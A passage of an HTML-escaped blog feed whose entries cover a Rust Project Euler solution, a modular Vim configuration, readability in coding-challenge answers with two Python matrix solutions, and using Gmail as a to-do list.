     Running `target/euler_1`
Enter the max number: 1000
Total sum: 233168
&lt;/span&gt;&lt;span class="gp"&gt;ninja:euler_1 unlogic$&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Some warnings about unstable calls, but it's an Alpha release, so what else can we expect? But the end
result is there.&lt;/p&gt;
&lt;p&gt;Well that was a nice little trip into Rust land, wasn't it?&lt;/p&gt;
&lt;p&gt;UPDATE: I posted this on &lt;a class="reference external" href="https://www.reddit.com/r/rust/comments/2s9lam/just_started_playing_with_rust_heres_a_write_up/"&gt;reddit&lt;/a&gt;
and having taken some suggestions on board, I have made some small changes:&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="kn"&gt;use&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;iter&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;AdditiveIterator&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;mut&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;max_num&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;numbers&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;

&lt;/span&gt;&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Enter the max number: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;read_line&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;ok&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;expect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Failed to read line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;Option&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="kd"&gt;let&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;match&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;input_num&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="nb"&gt;Some&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="nb"&gt;None&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
            &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Please input a number!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;
            &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;&lt;span class="w"&gt;

    &lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Total sum: {}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Also made the code (and all future solutions) available on &lt;a class="reference external" href="https://github.com/Svenito/euler_rust"&gt;Github&lt;/a&gt;&lt;/p&gt;
</summary></entry><entry><title>Vim settings done better</title><link href="http://unlogic.co.uk/2015/01/07/vim-settings-done-better/" rel="alternate"></link><updated>2015-01-07T21:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-07:2015/01/07/vim-settings-done-better/</id><summary type="html">&lt;p&gt;Today we'll cover a nice config setup for vim that I use. I got the idea from another
blog post elsewhere and I am sorry to say I cannot locate the post right now. If you
know of it, please leave a comment below and I will add it to the post as a credit.&lt;/p&gt;
&lt;p&gt;I say 'better' rather than 'right' because I don't believe there's necessarily a right way
to do it, only bad and better. Also, what works for one might not work for another, so
please adjust as required.&lt;/p&gt;
&lt;p&gt;The main principle for this setup is a modular rc file setup, where different files
are responsible for different configurations. This way it's easier to find a specific
setting rather than trawling through a long &lt;code&gt;.vimrc&lt;/code&gt; file. So, without further delay, here's
the main &lt;code&gt;.vimrc&lt;/code&gt; (which we still need). The role of this file is to source all the other
files we will create later. A &lt;a class="reference external" href="http://unlogic.co.uk/2013/02/08/vim-as-a-python-ide/"&gt;previous post&lt;/a&gt;
covers some configuration options specific for Python, if you are interested.&lt;/p&gt;
&lt;pre class="code vim literal-block"&gt;
&lt;span class="k"&gt;let&lt;/span&gt; s:vim_home &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'~/.vim/settings/'&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; config_list &lt;span class="p"&gt;=&lt;/span&gt; [
  \ &lt;span class="s1"&gt;'plugins.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'base.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'functions.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'theme.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'settings.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'leader.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'keymappings.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'languages.vim'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  \ &lt;span class="s1"&gt;'plugin_settings.vim'&lt;/span&gt;
\]

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;files&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; config_list
  &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;f&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; split&lt;span class="p"&gt;(&lt;/span&gt;glob&lt;span class="p"&gt;(&lt;/span&gt;s:vim_home.&lt;span class="k"&gt;files&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;'\n'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    exec &lt;span class="s1"&gt;'source '&lt;/span&gt;.&lt;span class="k"&gt;f&lt;/span&gt;
  &lt;span class="k"&gt;endfor&lt;/span&gt;

&lt;span class="k"&gt;endfor&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You can see how we'll divide up responsibility here. I won't go into details about the
contents of each file, I will leave that up to you to decide. Basically here we set a
directory - &lt;code&gt;~/.vim/settings/&lt;/code&gt; - as the root for our setting files. Then we have a list
of files which contain the configs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;plugins.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;This contains my Vundle setup and required plugins. The reason this is first is because
Vundle needs to have specific settings set that I change.&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;base.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Contains the basic config stuff like tab interpretation, indentation behaviour, and such.&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;functions.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Any vim functions you have written or use go in here&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;theme.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Theme configuration and selection&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;settings.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;I don't have much in here, just setting my code folding prefs, basically anything that's not in base&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;leader.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Any leader customisations go in here&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;keymappings.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Like leader, but for keymaps&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;languages.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Any language specific settings&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;&lt;strong&gt;plugin_settings.vim&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p class="first last"&gt;Configurations for all plugins. You might want to split this out further if it gets big&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I've been using this for a while now and am very pleased with how it works and how easy it
is now to find that specific setting that I need to tweak. No more searching through a long
.vimrc file, just go directly to a much smaller file and get back to your code much quicker.&lt;/p&gt;
&lt;p&gt;Hope you find this useful too. Feel free to share any other config tips in the comments below.&lt;/p&gt;
</summary></entry><entry><title>'[dis]like'</title><link href="http://unlogic.co.uk/2015/01/05/dislike/" rel="alternate"></link><updated>2015-01-05T22:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-05:2015/01/05/dislike/</id><summary type="html">&lt;p&gt;Isn't it just like me to start a new year with a post titled &amp;quot;[dis]like&amp;quot;? It's not as bad as it sounds. I want to write about coding challenge sites and what I like and dislike about them, specifically regarding Python challenges.&lt;/p&gt;
&lt;div class="section" id="what-i-like"&gt;
&lt;h2&gt;What I Like&lt;/h2&gt;
&lt;p&gt;I take part in coding challenges regularily for various reasons and I get a great deal of benefit from them. Albeit some challenges are a bit contrived, they do offer some great practice in problem solving and writing clean code.&lt;/p&gt;
&lt;p&gt;I recommend to anyone interesting in improving their coding skills to go to some programming challenge sites and home your skills. The problems are very varied and of different difficulties so there's something for everyone.&lt;/p&gt;
&lt;p&gt;I frequent &lt;a class="reference external" href="https://checkio.org"&gt;checkIO&lt;/a&gt; and &lt;a class="reference external" href="https://codewars.com"&gt;Codewars&lt;/a&gt; and have even submitted some challenges to the Codewars site. The benefit of attempting to solve the challenges is one thing, but to me the best return is from reading other people's solutions. Solving a problem one way, and then seeing how someone else solved it is very interesting and great learning experience.&lt;/p&gt;
&lt;p&gt;But this is also where the trouble begins.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="what-i-dislike"&gt;
&lt;h2&gt;What I Dislike&lt;/h2&gt;
&lt;p&gt;Let me begin by going over some parts of the &lt;a class="reference external" href="https://www.python.org/dev/peps/pep-0020/"&gt;PEP20&lt;/a&gt;&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Readability counts.&lt;/li&gt;
&lt;li&gt;Special cases aren't special enough to break the rules.&lt;/li&gt;
&lt;li&gt;Although practicality beats purity.&lt;/li&gt;
&lt;li&gt;Errors should never pass silently.&lt;/li&gt;
&lt;li&gt;Unless explicitly silenced.&lt;/li&gt;
&lt;li&gt;In the face of ambiguity, refuse the temptation to guess.&lt;/li&gt;
&lt;li&gt;There should be one-- and preferably only one --obvious way to do it.&lt;/li&gt;
&lt;li&gt;Although that way may not be obvious at first unless you're Dutch.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In this case I want to refer to &lt;em&gt;There should be one-- and preferably only one --obvious way to do it.&lt;/em&gt;
I admit, this is ambiguous for a good reason. What is this &lt;em&gt;obvious&lt;/em&gt; way? Taking the rest of the PEP20
into account we can sort of gleen a definition for this, but it's still open to interpretation by the
developer. So what's my issue here? Head over to one of these sites and look at a list of submitted solutions.
You get a lot of variety, some clever, some clear, some long, some short. A whole mixture of ways of doing it.
To me this goes against the whole Python way of &lt;em&gt;only one way&lt;/em&gt;. Sure, there's a wrong and a right, or to be more
precise, a bad, good and a better way to complete the task.&lt;/p&gt;
&lt;p&gt;The sites will let people vote on solutions that other developers like or think are best. I however don't always
agree with the general concensus. Sometimes I look at the top few solutions, and while clever, and quite pythonic in
certain ways, they are often not very clear. &lt;em&gt;Readability counts&lt;/em&gt;. Of course you are clever and can make use
of some of Python's awesome features and libraries, but not everyone you are going to be working with is going to
be that clever, or that well versed in Python.&lt;/p&gt;
&lt;p&gt;This is what matters to me. I look for readable code, because in a shared development environment you cannot rely on
the original developer to be around forever. One day they will leave and their smarts will go with them.
Then the slightly more elaborate code will be easier for the next person to pick up and the smart code will be left
to degrade and possibly be re-written. While you might think that the next developer will love your smart and
cryptic one-liners, they are most likely cursing your name. Consider having to debug someone else's
regular expression.&lt;/p&gt;
&lt;p&gt;I don't mean that &lt;em&gt;all&lt;/em&gt; top posts are bad, not by a long run. I have seen some very nice, elegant solutions in the top
3 voted posts, but a lot of the time people tend to reward cleverness over clarity or maintainability. Of course
in a programming challenge game that's ok, I guess it's part of the game, but outside of this, I look for different
values. CheckIO has a nice feature where solutions can be divided into different categories: clear, creative, speedy,
and uncategorised. I find that people on Codewars tend to favour the less readable (to me) solutions.&lt;/p&gt;
&lt;p&gt;I'll give you an example from CheckIO's &amp;quot;Weak Point&amp;quot; challenge. The aim was to calculate the sum of
each column and row of a matrix and return the row, column with the lowest sum. The top clear answer is this:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;weak_point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;row&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
    &lt;span class="n"&gt;col&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;row&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;col&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I like this. It's concise, makes use of some handy Python features and is readable. However, compare to this:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;weak_point&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cols&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sum&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;zip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;matrix&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="n"&gt;cols&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cols&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;This is the second most popular answer, and I would prefer this over the top one. To me this is more readable
and easier to understand. There are fewer nested conditionals and statements, and it makes sense (assuming you
understand how &lt;code&gt;map&lt;/code&gt; and &lt;code&gt;zip&lt;/code&gt; work).
Granted, this is my opinion and that doesn't mean anyone who voted for the other answer is wrong,
I am merely trying to say that if there is one way to do it, then how come there are so many ways to do it, and
most of them don't seem wrong? Should we also go for cleverness over maintainability and clarity? Perhaps I
am expecting the wrong thing from challenge site submissions.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="summary-tl-dr"&gt;
&lt;h2&gt;Summary (TL;DR)&lt;/h2&gt;
&lt;p&gt;Programming challenge sites are great for improving your skills but be careful about learning how to be too
clever. Being clever on your own and on challenge sites is great practice, but isn't always the best way
to solve an issue on a project that is or will me maintained by other people who you may
never get to talk to and explain your code to. But perhaps I'm just not as good at reading Python anymore.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Checking in</title><link href="http://unlogic.co.uk/2014/10/29/checking-in/" rel="alternate"></link><updated>2014-10-29T16:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-10-29:2014/10/29/checking-in/</id><summary type="html">&lt;p&gt;Just wanted to write a post to indicate that I am still around and also write about
something: How I use Gmail as my to-do list.&lt;/p&gt;
&lt;p&gt;I'm not usually one to write about things like this, because I personally don't
think they are that special, but after having a number of people marvel at
my Gmail inbox, I decided that I might as well write it down to share with anyone
else who might be interested.&lt;/p&gt;
&lt;p&gt;As you well know Gmail has an inbox where all your mail comes in. From what I see
this is where most people keep their mail and that's fine. However I get mail
that needs to be actioned. Be that a renewal, or a shipping notification that I
need to keep around until my item arrives, or even just a reply to a personal mail.&lt;/p&gt;
&lt;p&gt;I've used to-do managers like Any.do but they add overhead to the the process, so
I've managed to stream line the process using the archive function. It basically goes
like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Anything I don't care about gets deleted straight away.&lt;/li&gt;
&lt;li&gt;If it's something important that I need to keep I can add a label or star and
archive it.&lt;/li&gt;
&lt;li&gt;If I need to action it (reply, visit a site etc) it stays in my inbox&lt;/li&gt;
&lt;li&gt;If it's a shipping notification/receipt I keep it in the inbox until I have the item
and am happy with it. This serves two purposes 1) it reminds me what I am expecting
and 2) lets me find the invoice quickly in case of returns&lt;/li&gt;
&lt;li&gt;Once I have actioned an item it gets archived.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This way I have an empty inbox bar items that I actually care about. This adds
very little overhead in terms of keeping track of things that need to be done.&lt;/p&gt;
&lt;p&gt;Sure, this won't work if you need a reminder to get something done at 10am, but
I find we live in our inboxes so much that generally you will see these prompts
more often than you think. The added bonus is that you don't have a massive cluttered
inbox and important items are never far away.&lt;/p&gt;
&lt;p&gt;I'm sure that it doesn't replace a fully fledged to-do list/reminder app, but
it does the job very well for me, and getting my inbox zerod out is even more of
a push to take care of things. Plus you are never really going to be in a position
where you simply forgot to reply because you thought you already had done so. Or
you forgot to reply because you lost the email in the huge list of other mail you
have sitting in your inbox.&lt;/p&gt;
